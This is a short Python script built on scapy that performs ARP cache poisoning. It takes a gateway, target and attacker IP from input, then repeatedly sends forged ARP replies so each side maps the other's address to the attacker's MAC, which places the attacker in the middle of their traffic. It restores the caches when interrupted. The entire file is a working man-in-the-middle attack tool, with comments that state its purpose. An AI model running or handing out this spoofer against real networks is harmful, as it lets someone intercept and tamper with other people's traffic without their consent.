import scapy.all as scapy

gateway = input("Gateway> ")
target = input("Target> ")
myip = input("Your ip> ")


def spoofer(target, gateway):
	#This will tell both the gateway and the target that I'm the device they are searching for in this case it will tell the gateway that I'm the target and the target I'm the gateway
	pkt = scapy.ARP(pdst=target,hwdst=scapy.getmacbyip(target), psrc=gateway, hwsrc=scapy.getmacbyip(myip))
	scapy.send(pkt)
def reset(gateway, target):
	#here we sent the same request but we changed the mac address of the source so that we bring everthing back to normal
	pkt = scapy.ARP(pdst=target,hwdst=scapy.getmacbyip(target), psrc=gateway, hwsrc=scapy.getmacbyip(gateway))
	scapy.send(pkt)

try:
	while 1:
		spoofer(gateway, target)
		spoofer(target, gateway)
except KeyboardInterrupt:	
	reset(gateway, target)
	reset(target, gateway)
